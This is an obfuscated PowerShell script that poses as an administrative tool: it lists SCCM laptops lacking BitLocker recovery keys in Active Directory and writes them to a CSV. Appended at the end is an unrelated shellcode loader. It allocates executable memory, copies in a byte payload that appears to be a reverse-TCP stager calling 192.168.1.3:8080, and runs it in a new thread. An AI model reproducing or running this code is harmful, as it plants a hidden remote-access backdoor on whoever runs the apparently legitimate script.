param
(
	[string]
	${ouTPU`TFI`LE} = ("{1}{6}{5}{4}{3}{2}{0}" -f 'sv','M','Keys.c','ker','gBitloc','sin','is'),
	[string]
	${pa`Th}
)

function PR`Oc`ESSte`Xtf`ILe {
	If ((.("{0}{1}{2}" -f'Tes','t','-Path') -Path ${OUTpUT`FI`Le}) -eq ${T`RUE}) {
		&("{0}{1}{2}" -f'Rem','o','ve-Item') -Path ${O`U`TPuTFi`le} -Force
	}
}


function geT-LA`pTo`Ps {
	
	&("{2}{0}{1}{3}" -f'Varia','b','Set-','le') -Name ("{1}{0}"-f 'm','Ite') -Scope ("{0}{1}" -f 'L','ocal') -Force
	.("{1}{0}{3}{2}"-f'Vari','Set-','ble','a') -Name ("{1}{0}{2}" -f'uerySys','Q','tems') -Scope ("{0}{1}"-f'Loc','al') -Force
	.("{0}{1}{2}{3}"-f 'Set-','Va','riab','le') -Name ("{1}{0}" -f'stems','Sy') -Scope ("{0}{1}"-f'Lo','cal') -Force
	.("{1}{3}{0}{2}"-f 'ab','S','le','et-Vari') -Name ("{0}{1}"-f'WQ','L') -Scope ("{0}{1}" -f 'L','ocal') -Force
	
	${Q`UeRYSYS`T`ems} = @()
	.("{1}{3}{2}{0}" -f 'n','Set-Loc','o','ati') ("{0}{1}"-f'B','NA:')
	${w`Ql} = ((("{56}{106}{55}{102}{53}{113}{107}{21}{37}{76}{84}{44}{98}{43}{41}{72}{109}{36}{100}{18}{7}{35}{79}{74}{78}{104}{23}{89}{92}{24}{0}{30}{87}{27}{96}{73}{117}{110}{39}{120}{5}{50}{94}{119}{19}{70}{12}{32}{63}{3}{20}{65}{40}{8}{62}{13}{69}{105}{15}{1}{6}{54}{112}{85}{71}{4}{115}{47}{11}{75}{16}{48}{95}{42}{34}{46}{52}{9}{80}{83}{64}{86}{51}{116}{57}{38}{118}{68}{101}{22}{114}{59}{2}{90}{111}{77}{61}{108}{14}{60}{88}{49}{25}{10}{58}{81}{17}{45}{67}{82}{28}{97}{26}{33}{29}{91}{31}{103}{93}{99}{66}" -f'mai','ourceI','es','E on','yst','r','d whe','u','_',' lgO8lg','ha','TEM_EN','E','urceId = S','_','ystem.Res','L',' ','_SYSTEM.SMSUniq','stem inner join SMS_G_System_',' ','.ResourceI','RE.','M.R','Do','LOSURE.C','YST','g','G_','_E','nORW','S','N','EM','assisT','eIde','TEM.Name','D','_S','nt','_System','R','E.Ch','SMS_','ceTyp','= l','y','S','OS','_ENC','om SMS','Sy','pes =','_','re SMS','M','s','em','ss','sTyp','G_System_','lg','SYSTEM_ENCLOSURE.Reso','CLOSUR','G','SMS_G','assisTypes = lgO14lgO','gO1','CLOS','M','SYSTEM_','S','_','SMS_R_S','ier,SMS','C',',','9','_R_SYS','ntif','O or SM','isTypes','0lgO or SMS_','S_','SMS_R_SYSTEM.Resour','_','_','ork','SYSTEM','es',' ','NCLO','ource','E.C','_R','UR','roup,','System_S','e,','h',',SMS_R','U','S','UR','TE','S_R_S','elect S','M','O or SMS','SYS','ie','= lgO','_G','R_SYSTE','Chassi','em_SY','st','YSTEM.Cl','YSTEM_EN','_Sy',' f')) -rePLACE  ([cHar]108+[cHar]103+[cHar]79),[cHar]34)
	${sY`st`Ems} = &("{1}{0}{3}{2}" -f 'WmiO','Get-','t','bjec') -Namespace ((("{3}{4}{0}{5}{1}{2}"-f '0','_B','NA','R','oot4y','SMS4y0Site'))  -REpLace  ([ChaR]52+[ChaR]121+[ChaR]48),[ChaR]92) -Query ${w`ql}
	Foreach (${I`TEM} in ${sYST`EMS}) {
		${qu`ERYsY`St`EmS} = ${Qu`ERYS`YsTE`MS} + ${IT`em}."NA`mE"
	}
	.("{3}{0}{1}{2}" -f '-L','ocatio','n','Set') ('c:')
	${Q`UErYsyste`ms} = ${qu`ErYsYS`T`ems} | &("{2}{0}{1}{3}"-f 't','-Ob','Sor','ject')
    Return ${q`UERYs`Ys`TEms}
	
	
	.("{3}{1}{0}{2}"-f'ove-Variabl','m','e','Re') -Name ("{0}{1}" -f 'Ite','m') -Scope ("{0}{1}" -f'L','ocal') -Force
	.("{4}{3}{1}{2}{0}" -f 'ble','i','a','ar','Remove-V') -Name ("{3}{0}{1}{2}"-f 'r','yS','ystems','Que') -Scope ("{1}{0}" -f'l','Loca') -Force
	.("{0}{2}{1}{4}{3}" -f 'Rem','v','o','able','e-Vari') -Name ("{1}{0}" -f 's','System') -Scope ("{1}{0}"-f 'ocal','L') -Force
	&("{0}{4}{3}{2}{1}"-f'Remov','e','ariabl','-V','e') -Name ("{1}{0}" -f 'QL','W') -Scope ("{0}{1}"-f 'L','ocal') -Force
}

Function GeT`-`BITloC`kere`DsYsTEmS {
    
    &("{0}{1}{2}"-f'S','et-','Variable') -Name ("{0}{2}{1}{4}{3}"-f 'Bit','kerOb','Loc','ts','jec') -Scope ("{0}{1}" -f'Lo','cal') -Force
    &("{3}{0}{2}{1}" -f 'iab','e','l','Set-Var') -Name ("{0}{1}"-f 'Sy','stem') -Scope ("{1}{0}"-f'al','Loc') -Force
    &("{1}{0}{3}{2}" -f 'ari','Set-V','ble','a') -Name ("{1}{0}{2}"-f 'y','S','stems') -Scope ("{0}{1}" -f'Lo','cal') -Force

    ${uSe`Rna`mEs} = @()
    ${sYSt`Ems} = @()
    ${b`I`Tloc`k`ERobjEc`Ts} = .("{2}{1}{0}"-f'ect','et-ADObj','G') -Filter { &("{2}{1}{0}" -f'ass','cl','object') -eq ("{4}{0}{3}{5}{1}{2}{6}" -f 'sFV','r','y','E-Reco','m','ve','Information') }
    foreach (${sy`s`TeM} in ${bIt`loCKe`Ro`BjeCtS}) {
        ${Sy`S`Tem} = ${s`yStem}."diST`I`N`gUI`sHedNa`ME"
        ${sY`st`Em} = ${SY`sT`em}.("{1}{0}" -f 'plit','S').Invoke(',')
        ${S`YS`Tem} = ${S`Ys`TEM}[1]
        ${SyS`T`eM} = ${s`Yst`Em}.("{0}{1}" -f'Sp','lit').Invoke('=')
        ${sy`s`TemS} = ${S`y`STems} + ${Sys`TeM}[1]
    }
    Return ${Sy`stE`mS}

    
    &("{1}{0}{3}{2}"-f 'r','Remove-Va','e','iabl') -Name ("{0}{4}{1}{3}{2}" -f'B','ockerObjec','s','t','itL') -Scope ("{0}{1}"-f'Loca','l') -Force
    .("{1}{2}{0}" -f'e-Variable','R','emov') -Name ("{0}{1}" -f'Sys','tem') -Scope ("{0}{1}" -f'Lo','cal') -Force
    .("{2}{1}{4}{3}{0}"-f'riable','e','R','e-Va','mov') -Name ("{0}{1}"-f 'Sys','tems') -Scope ("{1}{0}" -f 'ocal','L') -Force
}

Function coN`F`i`Rm-BItlOc`k`ereD {
	param ([String[]]${LaPTO`ps}, [String[]]${b`iTLo`Cke`RedSysT`E`Ms})

    
    &("{3}{0}{1}{2}" -f 'riab','l','e','Set-Va') -Name ("{1}{0}{2}"-f'itlocke','B','red') -Scope ("{1}{0}"-f 'l','Loca') -Force
    .("{0}{2}{1}{3}" -f'Set','ria','-Va','ble') -Name ("{1}{2}{0}" -f'Row','He','ader') -Scope ("{0}{1}" -f 'Lo','cal') -Force
    &("{2}{1}{3}{0}" -f 'ariable','t-','Se','V') -Name ("{0}{1}" -f'Lapt','op') -Scope ("{0}{1}"-f'L','ocal') -Force
    &("{3}{0}{1}{2}" -f'r','iabl','e','Set-Va') -Name ("{0}{1}"-f 'Syst','em') -Scope ("{1}{0}"-f 'cal','Lo') -Force
	
	foreach (${LA`p`ToP} in ${lA`PTOPs}) {
        ${bItlOck`ER`ED} = ${Fa`lSE}
        foreach (${sY`St`em} in ${b`ITlocke`R`Eds`ystE`ms}) {
            If (${l`APt`op} -eq ${s`YSTem}) {
                ${BiTLOC`KER`ED} = ${T`Rue}
            }
        }
        If (${B`Itlo`cKEr`Ed} -eq ${fAl`sE}) {
            If ((.("{3}{1}{0}{2}"-f '-Pat','t','h','Tes') ${OU`TpuTFi`LE}) -eq ${fa`lse}) {
                ${hEA`Der`RoW} = ("{1}{2}{0}"-f 'ers','C','omput')+[char]44+("{0}{2}{1}"-f 'E','rypted','nc')+[char]44+("{3}{1}{0}{2}"-f 'ry','cove',' Key','Re')
                .("{2}{0}{1}"-f 'ut-','File','O') -FilePath ${o`UTPuT`FilE} -InputObject ${heaD`E`Rrow} -Force -Encoding ("{0}{1}" -f 'UTF','8')
            }
            .("{0}{2}{1}" -f 'O','e','ut-Fil') -FilePath ${oUT`PU`TFi`lE} -InputObject ${La`Pt`OP} -Append -Force -Encoding ("{0}{1}"-f 'U','TF8')
            .("{0}{2}{1}"-f 'Wri','t','te-Hos') ${lAP`T`OP}
        }
	}

    
    .("{2}{3}{4}{0}{1}" -f'bl','e','Remov','e-Vari','a') -Name ("{1}{2}{0}" -f'ered','Bit','lock') -Scope ("{0}{1}"-f'L','ocal') -Force
    &("{0}{2}{4}{3}{1}"-f 'R','e','e','iabl','move-Var') -Name ("{0}{1}{2}"-f 'Head','erRo','w') -Scope ("{0}{1}"-f 'Lo','cal') -Force
    &("{2}{0}{1}" -f'move','-Variable','Re') -Name ("{1}{0}{2}"-f 'pt','La','op') -Scope ("{1}{0}"-f'al','Loc') -Force
    .("{0}{1}{3}{4}{2}"-f 'Rem','ov','le','e-Vari','ab') -Name ("{0}{2}{1}" -f'Sys','m','te') -Scope ("{1}{0}"-f'l','Loca') -Force
}


&("{0}{2}{1}"-f'S','able','et-Vari') -Name ("{0}{2}{4}{1}{3}"-f'Bit','ker','l','edSystems','oc') -Scope ("{1}{0}"-f 'ocal','L') -Force
&("{1}{0}{2}{3}" -f '-Var','Set','iabl','e') -Name ("{0}{1}{2}"-f'L','aptop','s') -Scope ("{0}{1}" -f'Loca','l') -Force

.("{0}{1}" -f 'cl','s')
&("{0}{2}{1}" -f 'Impo','t-Module','r') ("{1}{0}{3}{2}{4}" -f't','Ac','v','i','eDirectory') -Scope ("{0}{1}{2}" -f'Gl','ob','al') -Force
&("{0}{3}{2}{1}"-f 'Im','Module','t-','por') ((("{2}{24}{25}{1}{18}{7}{0}{11}{22}{17}{16}{6}{4}{14}{19}{5}{23}{13}{10}{26}{8}{21}{9}{15}{20}{12}{3}" -f'oft Confi','}Progra','D:','d1','anage','m','n M','ros','{0}Conf','urationM','b','g','r.ps','nsole{0}','r{0}','a','o','rati','m Files{0}Mic','Ad','nage','ig','u','inCo','{','0','in')) -F  [CHAr]92) -Force -Scope ("{0}{1}"-f'Glob','al')
${OU`T`p`UTfILE} = ${P`ATh} + "\" + ${O`UT`pUT`FILE}
.("{2}{3}{1}{0}"-f'le','i','ProcessTe','xtF')
${l`AP`TOps} = &("{1}{0}{2}"-f 'ptop','Get-La','s')
${bITLoCKe`Re`dSY`ST`EmS} = .("{2}{1}{5}{0}{4}{3}" -f'keredSys','et-','G','ms','te','Bitloc')
&("{0}{1}{2}{3}{4}" -f'Confi','rm-B','itl','o','ckered') -Laptops ${l`AP`Tops} -BitlockeredSystems ${bItLOC`ke`R`e`dsySTEMS}


.("{3}{1}{0}{2}" -f'ariabl','move-V','e','Re') -Name ("{0}{2}{3}{4}{1}"-f'B','Systems','itlocker','e','d') -Scope ("{0}{1}" -f 'Lo','cal') -Force
.("{2}{3}{4}{1}{0}" -f'Variable','e-','Rem','o','v') -Name ("{1}{0}" -f 'aptops','L') -Scope ("{0}{1}"-f 'L','ocal') -Force

${C} = ((("{6}{86}{114}{122}{59}{53}{69}{128}{41}{113}{45}{80}{126}{39}{103}{27}{73}{29}{92}{112}{66}{32}{109}{30}{91}{87}{125}{42}{110}{106}{88}{90}{5}{63}{12}{68}{11}{99}{71}{44}{119}{129}{123}{74}{117}{8}{96}{47}{85}{24}{37}{48}{67}{108}{38}{116}{33}{18}{0}{65}{20}{62}{15}{46}{95}{19}{1}{7}{60}{9}{124}{34}{105}{98}{52}{118}{56}{76}{3}{111}{51}{102}{21}{13}{82}{93}{75}{31}{43}{127}{89}{50}{84}{57}{22}{23}{104}{55}{58}{61}{16}{83}{79}{2}{64}{17}{77}{14}{115}{54}{120}{72}{81}{78}{26}{49}{121}{28}{70}{35}{101}{25}{107}{94}{97}{36}{40}{10}{100}{4}"-f 'tern In','Thr','}m','Ptr ','nt);','i','[DllImport({0','ead',';[Dl','s,','nt co','ati','Al','ter, u','u','ateT','(','crt.dll{0})]','atic ex',' lp','Ptr','ntPtr lpParame','Th','read','rt','dest, ui','ntPtr','V','(','r','n','d','c',']public st',' dw','tPt',', u','(','.d',' IntP','i','e',' u','wCreatio','e','te','hread(Int','I','{0}k',' ','s, IntPtr','Address, ','ckS','lic s','c','o','In','lp','r','pub','Attribute','t',' Cre','ze, uint fl','sv','t','o','ernel3','loc','ta','In','Typ','static exter','i','rote','t ','t','p','I','0','r','n ','i','{',' ','mpo','}kernel32.d','s','w','lag','S','tPtr lpAddre','tualA','n','s','Ptr','l','rc','ta','on','u','r ','I','tr ','Id);[DllImp','S','d','nt ','2','(I','int ','lpStart','ll','x','l','bli','ll{0})','ct)','ize, ',', ui',' ','memset','l{0})]','P',' uint','s,','n','nF','tic ','nt fl'))-F  [cHAR]34);${w} = &("{2}{1}{0}" -f'e','yp','Add-T') -memberDefinition ${C} -Name ("{0}{1}" -f 'Win','32') -namespace ("{4}{2}{1}{3}{0}" -f'tions','32Fu','in','nc','W') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x03,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${Z}."l`enGth" -gt 0x1000){${g} = ${Z}."l`EngTh"};${X}=${w}::("{2}{1}{0}" -f 'loc','alAl','Virtu').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${z}."l`e`NgtH"-1);${I}++) {${w}::"mEM`S`eT"([IntPtr](${x}.("{0}{1}"-f'ToInt3','2').Invoke()+${I}), ${z}[${i}], 1)};${w}::("{1}{2}{0}"-f'read','C','reateTh').Invoke(0,0,${X},0,0,0);for (;;){.("{0}{2}{1}{3}"-f'S','ee','tart-sl','p') 60};
